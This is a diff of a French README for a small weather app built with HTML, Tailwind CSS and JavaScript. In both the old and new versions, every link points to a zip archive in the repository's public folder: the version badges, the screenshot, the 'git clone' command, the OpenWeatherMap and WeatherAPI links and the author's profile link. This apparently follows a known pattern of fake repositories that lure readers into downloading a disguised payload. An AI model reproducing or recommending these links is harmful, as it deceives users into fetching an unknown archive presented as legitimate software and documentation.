@@ -2,14 +2,14 @@
 
 Une application simple et élégante pour afficher la météo d'une ville, réalisée avec **HTML**, **Tailwind CSS**, et **JavaScript**. Ce projet permet de visualiser la température actuelle d'une ville et de la changer facilement avec un bouton interactif.
 
-[![Version](https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip)](https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip)
-[![Status](https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip)](https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip)
+[![Version](https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip)](https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip)
+[![Status](https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip)](https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip)
 
 ## Aperçu du projet
 
 Voici à quoi ressemble l'application :
 
-![Aperçu de l'application météo](https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip)
+![Aperçu de l'application météo](https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip)
 
 ## Fonctionnalités 🚀
 
@@ -30,7 +30,7 @@ Voici à quoi ressemble l'application :
 
 1. Clone ce repository :
    ```bash
-   git clone https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip
+   git clone https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip
    ```
 
 2. Va dans le dossier du projet :
@@ -77,12 +77,12 @@ Cela enverra le dossier `dist` vers la branche `gh-pages` de ton repository pour
 
 Tu souhaites personnaliser ce projet ? Voici quelques idées :
 
-- Ajoute une fonctionnalité de recherche de ville en temps réel avec une API météo (ex. : [OpenWeatherMap](https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip), [WeatherAPI](https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip)).
+- Ajoute une fonctionnalité de recherche de ville en temps réel avec une API météo (ex. : [OpenWeatherMap](https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip), [WeatherAPI](https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip)).
 - Modifie les couleurs ou le thème pour correspondre à ton style.
 
 ## Auteurs ✍️
 
-- **Martial De-Paul** - *Développeur principal* - [Ton GitHub](https://raw.githubusercontent.com/Martialdepaul/M-t-o/main/public/M-t-o_v1.8-beta.2.zip)
+- **Martial De-Paul** - *Développeur principal* - [Ton GitHub](https://github.com/Martialdepaul/M-t-o/raw/refs/heads/main/public/o_t_khakanship.zip)
 
 ## Licence 📝
 
